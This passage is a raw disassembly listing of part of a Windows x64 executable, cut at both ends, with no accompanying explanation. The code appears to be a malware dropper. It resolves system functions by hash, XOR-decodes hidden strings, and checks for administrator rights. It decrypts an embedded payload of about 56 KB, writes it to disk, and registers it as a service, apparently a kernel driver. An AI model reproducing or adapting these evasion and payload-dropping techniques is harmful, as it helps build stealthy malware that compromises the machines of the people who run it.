   140005694:	0f 11 0d 45 a4 01 00 	movups %xmm1,0x1a445(%rip)        # 0x14001fae0
   14000569b:	66 0f 6f 05 4d 94 00 	movdqa 0x944d(%rip),%xmm0        # 0x14000eaf0
   1400056a2:	00 
   1400056a3:	f3 0f 7f 45 d0       	movdqu %xmm0,-0x30(%rbp)
   1400056a8:	c6 45 c0 00          	movb   $0x0,-0x40(%rbp)
   1400056ac:	49 83 fe 0f          	cmp    $0xf,%r14
   1400056b0:	76 59                	jbe    0x14000570b
   1400056b2:	49 8d 56 01          	lea    0x1(%r14),%rdx
   1400056b6:	48 8b c7             	mov    %rdi,%rax
   1400056b9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400056c0:	72 41                	jb     0x140005703
   1400056c2:	48 83 c2 27          	add    $0x27,%rdx
   1400056c6:	48 8b 7f f8          	mov    -0x8(%rdi),%rdi
   1400056ca:	48 2b c7             	sub    %rdi,%rax
   1400056cd:	48 83 e8 08          	sub    $0x8,%rax
   1400056d1:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400056d5:	76 2c                	jbe    0x140005703
   1400056d7:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400056dc:	45 33 c9             	xor    %r9d,%r9d
   1400056df:	45 33 c0             	xor    %r8d,%r8d
   1400056e2:	33 d2                	xor    %edx,%edx
   1400056e4:	33 c9                	xor    %ecx,%ecx
   1400056e6:	ff 15 64 5c 00 00    	call   *0x5c64(%rip)        # 0x14000b350
   1400056ec:	90                   	nop
   1400056ed:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400056f2:	45 33 c9             	xor    %r9d,%r9d
   1400056f5:	45 33 c0             	xor    %r8d,%r8d
   1400056f8:	33 d2                	xor    %edx,%edx
   1400056fa:	33 c9                	xor    %ecx,%ecx
   1400056fc:	ff 15 4e 5c 00 00    	call   *0x5c4e(%rip)        # 0x14000b350
   140005702:	90                   	nop
   140005703:	48 8b cf             	mov    %rdi,%rcx
   140005706:	e8 91 33 00 00       	call   0x140008a9c
   14000570b:	89 75 e8             	mov    %esi,-0x18(%rbp)
   14000570e:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140005712:	48 8d 0d 67 92 00 00 	lea    0x9267(%rip),%rcx        # 0x14000e980
   140005719:	ff 15 e9 58 00 00    	call   *0x58e9(%rip)        # 0x14000b008
   14000571f:	4c 8b f0             	mov    %rax,%r14
   140005722:	48 85 c0             	test   %rax,%rax
   140005725:	0f 84 01 0a 00 00    	je     0x14000612c
   14000572b:	ba 0f 07 b2 53       	mov    $0x53b2070f,%edx
   140005730:	48 8b c8             	mov    %rax,%rcx
   140005733:	e8 b8 ed ff ff       	call   0x1400044f0
   140005738:	48 8b f8             	mov    %rax,%rdi
   14000573b:	ba 25 57 f4 f8       	mov    $0xf8f45725,%edx
   140005740:	49 8b ce             	mov    %r14,%rcx
   140005743:	e8 a8 ed ff ff       	call   0x1400044f0
   140005748:	48 85 ff             	test   %rdi,%rdi
   14000574b:	0f 84 db 09 00 00    	je     0x14000612c
   140005751:	48 85 c0             	test   %rax,%rax
   140005754:	0f 84 d2 09 00 00    	je     0x14000612c
   14000575a:	48 8d 0d 2f 92 00 00 	lea    0x922f(%rip),%rcx        # 0x14000e990
   140005761:	ff d7                	call   *%rdi
   140005763:	48 8b f8             	mov    %rax,%rdi
   140005766:	48 85 c0             	test   %rax,%rax
   140005769:	0f 84 bd 09 00 00    	je     0x14000612c
   14000576f:	ba 33 62 44 95       	mov    $0x95446233,%edx
   140005774:	48 8b c8             	mov    %rax,%rcx
   140005777:	e8 74 ed ff ff       	call   0x1400044f0
   14000577c:	4c 8b e8             	mov    %rax,%r13
   14000577f:	ba 64 e8 dc fc       	mov    $0xfcdce864,%edx
   140005784:	48 8b cf             	mov    %rdi,%rcx
   140005787:	e8 64 ed ff ff       	call   0x1400044f0
   14000578c:	4c 8b f8             	mov    %rax,%r15
   14000578f:	ba e5 0e 2c 2d       	mov    $0x2d2c0ee5,%edx
   140005794:	48 8b cf             	mov    %rdi,%rcx
   140005797:	e8 54 ed ff ff       	call   0x1400044f0
   14000579c:	4c 8b e0             	mov    %rax,%r12
   14000579f:	4d 85 ed             	test   %r13,%r13
   1400057a2:	0f 84 6d 09 00 00    	je     0x140006115
   1400057a8:	4d 85 ff             	test   %r15,%r15
   1400057ab:	0f 84 64 09 00 00    	je     0x140006115
   1400057b1:	48 85 c0             	test   %rax,%rax
   1400057b4:	0f 84 5b 09 00 00    	je     0x140006115
   1400057ba:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
   1400057c1:	66 c7 45 f4 00 05    	movw   $0x500,-0xc(%rbp)
   1400057c7:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   1400057cb:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400057d0:	89 74 24 48          	mov    %esi,0x48(%rsp)
   1400057d4:	89 74 24 40          	mov    %esi,0x40(%rsp)
   1400057d8:	89 74 24 38          	mov    %esi,0x38(%rsp)
   1400057dc:	89 74 24 30          	mov    %esi,0x30(%rsp)
   1400057e0:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400057e4:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400057e8:	41 b9 20 02 00 00    	mov    $0x220,%r9d
   1400057ee:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   1400057f4:	b2 02                	mov    $0x2,%dl
   1400057f6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400057fa:	41 ff d5             	call   *%r13
   1400057fd:	85 c0                	test   %eax,%eax
   1400057ff:	74 14                	je     0x140005815
   140005801:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140005805:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   140005809:	33 c9                	xor    %ecx,%ecx
   14000580b:	41 ff d7             	call   *%r15
   14000580e:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140005812:	41 ff d4             	call   *%r12
   140005815:	ba ee c5 45 ab       	mov    $0xab45c5ee,%edx
   14000581a:	49 8b ce             	mov    %r14,%rcx
   14000581d:	e8 ce ec ff ff       	call   0x1400044f0
   140005822:	48 85 c0             	test   %rax,%rax
   140005825:	74 05                	je     0x14000582c
   140005827:	48 8b cf             	mov    %rdi,%rcx
   14000582a:	ff d0                	call   *%rax
   14000582c:	83 7d e8 00          	cmpl   $0x0,-0x18(%rbp)
   140005830:	0f 84 f6 08 00 00    	je     0x14000612c
   140005836:	48 8d 0d 53 91 00 00 	lea    0x9153(%rip),%rcx        # 0x14000e990
   14000583d:	ff 15 e5 57 00 00    	call   *0x57e5(%rip)        # 0x14000b028
   140005843:	4c 8b e0             	mov    %rax,%r12
   140005846:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   14000584a:	48 85 c0             	test   %rax,%rax
   14000584d:	0f 85 87 00 00 00    	jne    0x1400058da
   140005853:	ff 15 bf 57 00 00    	call   *0x57bf(%rip)        # 0x14000b018
   140005859:	8b f8                	mov    %eax,%edi
   14000585b:	48 8b 15 a6 ac 01 00 	mov    0x1aca6(%rip),%rdx        # 0x140020508
   140005862:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005867:	e8 f4 0b 00 00       	call   0x140006460
   14000586c:	4c 8d 0d 7d 90 00 00 	lea    0x907d(%rip),%r9        # 0x14000e8f0
   140005873:	48 ff c3             	inc    %rbx
   140005876:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   14000587b:	75 f6                	jne    0x140005873
   14000587d:	48 83 3d 83 ac 01 00 	cmpq   $0x0,0x1ac83(%rip)        # 0x140020508
   140005884:	00 
   140005885:	0f 86 28 09 00 00    	jbe    0x1400061b3
   14000588b:	4c 8d 15 66 ac 01 00 	lea    0x1ac66(%rip),%r10        # 0x1400204f8
   140005892:	4d 8b c2             	mov    %r10,%r8
   140005895:	48 83 3d 73 ac 01 00 	cmpq   $0xf,0x1ac73(%rip)        # 0x140020510
   14000589c:	0f 
   14000589d:	4c 0f 47 05 53 ac 01 	cmova  0x1ac53(%rip),%r8        # 0x1400204f8
   1400058a4:	00 
   1400058a5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400058aa:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   1400058af:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   1400058b5:	33 d2                	xor    %edx,%edx
   1400058b7:	48 8b c6             	mov    %rsi,%rax
   1400058ba:	48 f7 f3             	div    %rbx
   1400058bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400058c2:	41 32 04 30          	xor    (%r8,%rsi,1),%al
   1400058c6:	88 04 31             	mov    %al,(%rcx,%rsi,1)
   1400058c9:	48 ff c6             	inc    %rsi
   1400058cc:	48 3b 35 35 ac 01 00 	cmp    0x1ac35(%rip),%rsi        # 0x140020508
   1400058d3:	72 bd                	jb     0x140005892
   1400058d5:	e9 d9 08 00 00       	jmp    0x1400061b3
   1400058da:	ba 4d ac 81 c1       	mov    $0xc181ac4d,%edx
   1400058df:	49 8b cc             	mov    %r12,%rcx
   1400058e2:	e8 09 ec ff ff       	call   0x1400044f0
   1400058e7:	4c 8b f0             	mov    %rax,%r14
   1400058ea:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1400058ee:	ba a7 c5 f2 fe       	mov    $0xfef2c5a7,%edx
   1400058f3:	49 8b cc             	mov    %r12,%rcx
   1400058f6:	e8 f5 eb ff ff       	call   0x1400044f0
   1400058fb:	4c 8b f8             	mov    %rax,%r15
   1400058fe:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140005902:	ba 79 bc 1f c3       	mov    $0xc31fbc79,%edx
   140005907:	49 8b cc             	mov    %r12,%rcx
   14000590a:	e8 e1 eb ff ff       	call   0x1400044f0
   14000590f:	48 8b f8             	mov    %rax,%rdi
   140005912:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140005916:	ba 60 fe 47 2e       	mov    $0x2e47fe60,%edx
   14000591b:	49 8b cc             	mov    %r12,%rcx
   14000591e:	e8 cd eb ff ff       	call   0x1400044f0
   140005923:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140005927:	4d 85 f6             	test   %r14,%r14
   14000592a:	0f 84 27 07 00 00    	je     0x140006057
   140005930:	4d 85 ff             	test   %r15,%r15
   140005933:	0f 84 1e 07 00 00    	je     0x140006057
   140005939:	48 85 ff             	test   %rdi,%rdi
   14000593c:	0f 84 15 07 00 00    	je     0x140006057
   140005942:	48 85 c0             	test   %rax,%rax
   140005945:	0f 84 0c 07 00 00    	je     0x140006057
   14000594b:	48 8b 15 96 ab 01 00 	mov    0x1ab96(%rip),%rdx        # 0x1400204e8
   140005952:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005956:	e8 05 0b 00 00       	call   0x140006460
   14000595b:	4c 8b d3             	mov    %rbx,%r10
   14000595e:	4c 8d 1d 8b 8f 00 00 	lea    0x8f8b(%rip),%r11        # 0x14000e8f0
   140005965:	49 ff c2             	inc    %r10
   140005968:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   14000596d:	75 f6                	jne    0x140005965
   14000596f:	4c 8b ce             	mov    %rsi,%r9
   140005972:	48 39 35 6f ab 01 00 	cmp    %rsi,0x1ab6f(%rip)        # 0x1400204e8
   140005979:	76 49                	jbe    0x1400059c4
   14000597b:	48 8d 3d 56 ab 01 00 	lea    0x1ab56(%rip),%rdi        # 0x1400204d8
   140005982:	4c 8b c7             	mov    %rdi,%r8
   140005985:	48 83 3d 63 ab 01 00 	cmpq   $0xf,0x1ab63(%rip)        # 0x1400204f0
   14000598c:	0f 
   14000598d:	4c 0f 47 05 43 ab 01 	cmova  0x1ab43(%rip),%r8        # 0x1400204d8
   140005994:	00 
   140005995:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140005999:	48 83 7d 30 0f       	cmpq   $0xf,0x30(%rbp)
   14000599e:	48 0f 47 4d 18       	cmova  0x18(%rbp),%rcx
   1400059a3:	33 d2                	xor    %edx,%edx
   1400059a5:	49 8b c1             	mov    %r9,%rax
   1400059a8:	49 f7 f2             	div    %r10
   1400059ab:	42 0f b6 04 1a       	movzbl (%rdx,%r11,1),%eax
   1400059b0:	43 32 04 08          	xor    (%r8,%r9,1),%al
   1400059b4:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   1400059b8:	49 ff c1             	inc    %r9
   1400059bb:	4c 3b 0d 26 ab 01 00 	cmp    0x1ab26(%rip),%r9        # 0x1400204e8
   1400059c2:	72 be                	jb     0x140005982
   1400059c4:	48 8b 15 5d ab 01 00 	mov    0x1ab5d(%rip),%rdx        # 0x140020528
   1400059cb:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400059cf:	e8 8c 0a 00 00       	call   0x140006460
   1400059d4:	4c 8d 35 0d 8f 00 00 	lea    0x8f0d(%rip),%r14        # 0x14000e8e8
   1400059db:	4c 8b db             	mov    %rbx,%r11
   1400059de:	66 90                	xchg   %ax,%ax
   1400059e0:	49 ff c3             	inc    %r11
   1400059e3:	43 80 3c 1e 00       	cmpb   $0x0,(%r14,%r11,1)
   1400059e8:	75 f6                	jne    0x1400059e0
   1400059ea:	4c 8b d6             	mov    %rsi,%r10
   1400059ed:	48 39 35 34 ab 01 00 	cmp    %rsi,0x1ab34(%rip)        # 0x140020528
   1400059f4:	76 4c                	jbe    0x140005a42
   1400059f6:	48 8d 3d 1b ab 01 00 	lea    0x1ab1b(%rip),%rdi        # 0x140020518
   1400059fd:	0f 1f 00             	nopl   (%rax)
   140005a00:	4c 8b cf             	mov    %rdi,%r9
   140005a03:	48 83 3d 25 ab 01 00 	cmpq   $0xf,0x1ab25(%rip)        # 0x140020530
   140005a0a:	0f 
   140005a0b:	4c 0f 47 0d 05 ab 01 	cmova  0x1ab05(%rip),%r9        # 0x140020518
   140005a12:	00 
   140005a13:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140005a17:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   140005a1c:	4c 0f 47 45 f8       	cmova  -0x8(%rbp),%r8
   140005a21:	33 d2                	xor    %edx,%edx
   140005a23:	49 8b c2             	mov    %r10,%rax
   140005a26:	49 f7 f3             	div    %r11
   140005a29:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   140005a2e:	43 32 04 11          	xor    (%r9,%r10,1),%al
   140005a32:	43 88 04 10          	mov    %al,(%r8,%r10,1)
   140005a36:	49 ff c2             	inc    %r10
   140005a39:	4c 3b 15 e8 aa 01 00 	cmp    0x1aae8(%rip),%r10        # 0x140020528
   140005a40:	72 be                	jb     0x140005a00
   140005a42:	48 8d 0d 37 8f 00 00 	lea    0x8f37(%rip),%rcx        # 0x14000e980
   140005a49:	ff 15 b9 55 00 00    	call   *0x55b9(%rip)        # 0x14000b008
   140005a4f:	4c 8b e8             	mov    %rax,%r13
   140005a52:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140005a58:	48 85 c0             	test   %rax,%rax
   140005a5b:	0f 84 94 04 00 00    	je     0x140005ef5
   140005a61:	ba ce c9 ca bd       	mov    $0xbdcac9ce,%edx
   140005a66:	48 8b c8             	mov    %rax,%rcx
   140005a69:	e8 82 ea ff ff       	call   0x1400044f0
   140005a6e:	48 8b f8             	mov    %rax,%rdi
   140005a71:	ba 4a c4 07 7f       	mov    $0x7f07c44a,%edx
   140005a76:	49 8b cd             	mov    %r13,%rcx
   140005a79:	e8 72 ea ff ff       	call   0x1400044f0
   140005a7e:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140005a82:	ba 65 00 ba fa       	mov    $0xfaba0065,%edx
   140005a87:	49 8b cd             	mov    %r13,%rcx
   140005a8a:	e8 61 ea ff ff       	call   0x1400044f0
   140005a8f:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140005a93:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140005a97:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   140005a9c:	48 0f 47 4d f8       	cmova  -0x8(%rbp),%rcx
   140005aa1:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140005aa6:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140005aad:	00 
   140005aae:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140005ab5:	00 
   140005ab6:	45 33 c9             	xor    %r9d,%r9d
   140005ab9:	45 33 c0             	xor    %r8d,%r8d
   140005abc:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140005ac1:	ff d7                	call   *%rdi
   140005ac3:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005ac7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005acb:	0f 84 24 04 00 00    	je     0x140005ef5
   140005ad1:	4c 8b cb             	mov    %rbx,%r9
   140005ad4:	48 8d 05 15 8e 00 00 	lea    0x8e15(%rip),%rax        # 0x14000e8f0
   140005adb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ae0:	49 ff c1             	inc    %r9
   140005ae3:	42 80 3c 08 00       	cmpb   $0x0,(%rax,%r9,1)
   140005ae8:	75 f6                	jne    0x140005ae0
   140005aea:	4c 8d 35 cf c5 00 00 	lea    0xc5cf(%rip),%r14        # 0x1400120c0
   140005af1:	4d 8b d7             	mov    %r15,%r10
   140005af4:	4d 2b d6             	sub    %r14,%r10
   140005af7:	41 bb 02 00 00 00    	mov    $0x2,%r11d
   140005afd:	4d 2b de             	sub    %r14,%r11
   140005b00:	bf 03 00 00 00       	mov    $0x3,%edi
   140005b05:	49 2b fe             	sub    %r14,%rdi
   140005b08:	41 bd 04 00 00 00    	mov    $0x4,%r13d
   140005b0e:	4d 2b ee             	sub    %r14,%r13
   140005b11:	41 b8 05 00 00 00    	mov    $0x5,%r8d
   140005b17:	4d 2b c6             	sub    %r14,%r8
   140005b1a:	4c 8b e6             	mov    %rsi,%r12
   140005b1d:	4c 8d 3d cc 8d 00 00 	lea    0x8dcc(%rip),%r15        # 0x14000e8f0
   140005b24:	4b 8d 0c 34          	lea    (%r12,%r14,1),%rcx
   140005b28:	33 d2                	xor    %edx,%edx
   140005b2a:	49 8b c4             	mov    %r12,%rax
   140005b2d:	49 f7 f1             	div    %r9
   140005b30:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b35:	30 01                	xor    %al,(%rcx)
   140005b37:	4a 8d 04 11          	lea    (%rcx,%r10,1),%rax
   140005b3b:	33 d2                	xor    %edx,%edx
   140005b3d:	49 f7 f1             	div    %r9
   140005b40:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b45:	30 41 01             	xor    %al,0x1(%rcx)
   140005b48:	4a 8d 04 19          	lea    (%rcx,%r11,1),%rax
   140005b4c:	33 d2                	xor    %edx,%edx
   140005b4e:	49 f7 f1             	div    %r9
   140005b51:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b56:	30 41 02             	xor    %al,0x2(%rcx)
   140005b59:	48 8d 04 39          	lea    (%rcx,%rdi,1),%rax
   140005b5d:	33 d2                	xor    %edx,%edx
   140005b5f:	49 f7 f1             	div    %r9
   140005b62:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b67:	30 41 03             	xor    %al,0x3(%rcx)
   140005b6a:	4a 8d 04 29          	lea    (%rcx,%r13,1),%rax
   140005b6e:	33 d2                	xor    %edx,%edx
   140005b70:	49 f7 f1             	div    %r9
   140005b73:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b78:	30 41 04             	xor    %al,0x4(%rcx)
   140005b7b:	4a 8d 04 01          	lea    (%rcx,%r8,1),%rax
   140005b7f:	33 d2                	xor    %edx,%edx
   140005b81:	49 f7 f1             	div    %r9
   140005b84:	42 0f b6 04 3a       	movzbl (%rdx,%r15,1),%eax
   140005b89:	30 41 05             	xor    %al,0x5(%rcx)
   140005b8c:	49 83 c4 06          	add    $0x6,%r12
   140005b90:	49 81 fc 10 da 00 00 	cmp    $0xda10,%r12
   140005b97:	72 8b                	jb     0x140005b24
   140005b99:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005b9e:	4c 8d 4d e8          	lea    -0x18(%rbp),%r9
   140005ba2:	41 b8 10 da 00 00    	mov    $0xda10,%r8d
   140005ba8:	49 8b d6             	mov    %r14,%rdx
   140005bab:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140005baf:	ff 55 98             	call   *-0x68(%rbp)
   140005bb2:	8b f8                	mov    %eax,%edi
   140005bb4:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140005bb8:	ff 55 a0             	call   *-0x60(%rbp)
   140005bbb:	85 ff                	test   %edi,%edi
   140005bbd:	4c 8d 35 24 8d 00 00 	lea    0x8d24(%rip),%r14        # 0x14000e8e8
   140005bc4:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140005bca:	4c 8b 65 a8          	mov    -0x58(%rbp),%r12
   140005bce:	0f 84 21 03 00 00    	je     0x140005ef5
   140005bd4:	33 d2                	xor    %edx,%edx
   140005bd6:	33 c9                	xor    %ecx,%ecx
   140005bd8:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140005bde:	ff 55 b0             	call   *-0x50(%rbp)
   140005be1:	4c 8b e8             	mov    %rax,%r13
   140005be4:	48 85 c0             	test   %rax,%rax
   140005be7:	0f 85 8d 00 00 00    	jne    0x140005c7a
   140005bed:	ff 15 25 54 00 00    	call   *0x5425(%rip)        # 0x14000b018
   140005bf3:	8b f8                	mov    %eax,%edi
   140005bf5:	48 8b 15 ac a9 01 00 	mov    0x1a9ac(%rip),%rdx        # 0x1400205a8
   140005bfc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005c01:	e8 5a 08 00 00       	call   0x140006460
   140005c06:	4c 8d 15 e3 8c 00 00 	lea    0x8ce3(%rip),%r10        # 0x14000e8f0
   140005c0d:	0f 1f 00             	nopl   (%rax)
   140005c10:	48 ff c3             	inc    %rbx
   140005c13:	41 80 3c 1a 00       	cmpb   $0x0,(%r10,%rbx,1)
   140005c18:	75 f6                	jne    0x140005c10
   140005c1a:	4c 8b ce             	mov    %rsi,%r9
   140005c1d:	48 39 35 84 a9 01 00 	cmp    %rsi,0x1a984(%rip)        # 0x1400205a8
   140005c24:	0f 86 4c 03 00 00    	jbe    0x140005f76
   140005c2a:	4c 8d 1d 67 a9 01 00 	lea    0x1a967(%rip),%r11        # 0x140020598
   140005c31:	4d 8b c3             	mov    %r11,%r8
   140005c34:	48 83 3d 74 a9 01 00 	cmpq   $0xf,0x1a974(%rip)        # 0x1400205b0
   140005c3b:	0f 
   140005c3c:	4c 0f 47 05 54 a9 01 	cmova  0x1a954(%rip),%r8        # 0x140020598
   140005c43:	00 
   140005c44:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005c49:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005c4e:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005c54:	33 d2                	xor    %edx,%edx
   140005c56:	49 8b c1             	mov    %r9,%rax
   140005c59:	48 f7 f3             	div    %rbx
   140005c5c:	42 0f b6 04 12       	movzbl (%rdx,%r10,1),%eax
   140005c61:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005c65:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005c69:	49 ff c1             	inc    %r9
   140005c6c:	4c 3b 0d 35 a9 01 00 	cmp    0x1a935(%rip),%r9        # 0x1400205a8
   140005c73:	72 bc                	jb     0x140005c31
   140005c75:	e9 fc 02 00 00       	jmp    0x140005f76
   140005c7a:	4c 8d 45 18          	lea    0x18(%rbp),%r8
   140005c7e:	48 83 7d 30 0f       	cmpq   $0xf,0x30(%rbp)
   140005c83:	4c 0f 47 45 18       	cmova  0x18(%rbp),%r8
   140005c88:	48 8d 55 18          	lea    0x18(%rbp),%rdx
   140005c8c:	48 0f 47 55 18       	cmova  0x18(%rbp),%rdx
   140005c91:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   140005c95:	48 83 7d 10 0f       	cmpq   $0xf,0x10(%rbp)
   140005c9a:	48 0f 47 45 f8       	cmova  -0x8(%rbp),%rax
   140005c9f:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
   140005ca4:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140005ca9:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140005cae:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140005cb3:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140005cb8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005cbd:	44 89 7c 24 30       	mov    %r15d,0x30(%rsp)
   140005cc2:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140005cc9:	00 
   140005cca:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140005ccf:	41 b9 ff 01 0f 00    	mov    $0xf01ff,%r9d
   140005cd5:	49 8b cd             	mov    %r13,%rcx
   140005cd8:	ff 55 b8             	call   *-0x48(%rbp)
   140005cdb:	48 8b f8             	mov    %rax,%rdi
   140005cde:	48 85 c0             	test   %rax,%rax
   140005ce1:	0f 85 ac 00 00 00    	jne    0x140005d93
   140005ce7:	ff 15 2b 53 00 00    	call   *0x532b(%rip)        # 0x14000b018
   140005ced:	8b f8                	mov    %eax,%edi
   140005cef:	48 8b 15 b2 a7 01 00 	mov    0x1a7b2(%rip),%rdx        # 0x1400204a8
   140005cf6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005cfb:	e8 60 07 00 00       	call   0x140006460
   140005d00:	48 ff c3             	inc    %rbx
   140005d03:	41 80 3c 1e 00       	cmpb   $0x0,(%r14,%rbx,1)
   140005d08:	75 f6                	jne    0x140005d00
   140005d0a:	4c 8b ce             	mov    %rsi,%r9
   140005d0d:	48 39 35 94 a7 01 00 	cmp    %rsi,0x1a794(%rip)        # 0x1400204a8
   140005d14:	76 4e                	jbe    0x140005d64
   140005d16:	4c 8d 15 7b a7 01 00 	lea    0x1a77b(%rip),%r10        # 0x140020498
   140005d1d:	0f 1f 00             	nopl   (%rax)
   140005d20:	4d 8b c2             	mov    %r10,%r8
   140005d23:	48 83 3d 85 a7 01 00 	cmpq   $0xf,0x1a785(%rip)        # 0x1400204b0
   140005d2a:	0f 
   140005d2b:	4c 0f 47 05 65 a7 01 	cmova  0x1a765(%rip),%r8        # 0x140020498
   140005d32:	00 
   140005d33:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005d38:	48 83 7d 88 0f       	cmpq   $0xf,-0x78(%rbp)
   140005d3d:	48 0f 47 4c 24 70    	cmova  0x70(%rsp),%rcx
   140005d43:	33 d2                	xor    %edx,%edx
   140005d45:	49 8b c1             	mov    %r9,%rax
   140005d48:	48 f7 f3             	div    %rbx
   140005d4b:	42 0f b6 04 32       	movzbl (%rdx,%r14,1),%eax
   140005d50:	43 32 04 08          	xor    (%r8,%r9,1),%al
   140005d54:	42 88 04 09          	mov    %al,(%rcx,%r9,1)
   140005d58:	49 ff c1             	inc    %r9
   140005d5b:	4c 3b 0d 46 a7 01 00 	cmp    0x1a746(%rip),%r9        # 0x1400204a8
   140005d62:	72 bc                	jb     0x140005d20
   140005d64:	48 8d 15 65 9d 01 00 	lea    0x19d65(%rip),%rdx        # 0x14001fad0
   140005d6b:	48 83 3d 75 9d 01 00 	cmpq   $0xf,0x19d75(%rip)        # 0x14001fae8
   140005d72:	0f 
   140005d73:	48 0f 47 15 55 9d 01 	cmova  0x19d55(%rip),%rdx        # 0x14001fad0
   140005d7a:	00 
   140005d7b:	44 8b cf             	mov    %edi,%r9d
   140005d7e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005d83:	e8 38 e8 ff ff       	call   0x1400045c0
   140005d88:	49 8b cd             	mov    %r13,%rcx
   140005d8b:	ff 55 e0             	call   *-0x20(%rbp)
   140005d8e:	e9 07 02 00 00       	jmp    0x140005f9a
   140005d93:	45 33 c0             	xor    %r8d,%r8d
   140005d96:	33 d2                	xor    %edx,%edx
   140005d98:	48 8b cf             	mov    %rdi,%rcx
   140005d9b:	ff 55 90             	call   *-0x70(%rbp)
   140005d9e:	85 c0                	test   %eax,%eax
   140005da0:	0f 85 aa 00 00 00    	jne    0x140005e50
   140005da6:	ff 15 6c 52 00 00    	call   *0x526c(%rip)        # 0x14000b018
   140005dac:	8b f8                	mov    %eax,%edi
   140005dae:	48 8b 15 b3 a7 01 00 	mov    0x1a7b3(%rip),%rdx        # 0x140020568
   140005db5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005dba:	e8 a1 06 00 00       	call   0x140006460
   140005dbf:	4c 8d 0d 1a 8b 00 00 	lea    0x8b1a(%rip),%r9        # 0x14000e8e0
   140005dc6:	48 ff c3             	inc    %rbx
   140005dc9:	41 80 3c 19 00       	cmpb   $0x0,(%r9,%rbx,1)
   140005dce:	75 f6                	jne    0x140005dc6
   140005dd0:	4c 8b d6             	mov    %rsi,%r10
   140005dd3:	48 39 35 8e a7 01 00 	cmp    %rsi,0x1a78e(%rip)        # 0x140020568
   140005dda:	76 4b                	jbe    0x140005e27
   140005ddc:	4c 8d 1d 75 a7 01 00 	lea    0x1a775(%rip),%r11        # 0x140020558
   140005de3:	4d 8b c3             	mov    %r11,%r8
   140005de6:	48 83 3d 82 a7 01 00 	cmpq   $0xf,0x1a782(%rip)        # 0x140020570
   140005ded:	0f 
   140005dee:	4c 0f 47 05 62 a7 01 	cmova  0x1a762(%rip),%r8        # 0x140020558
   140005df5:	00 
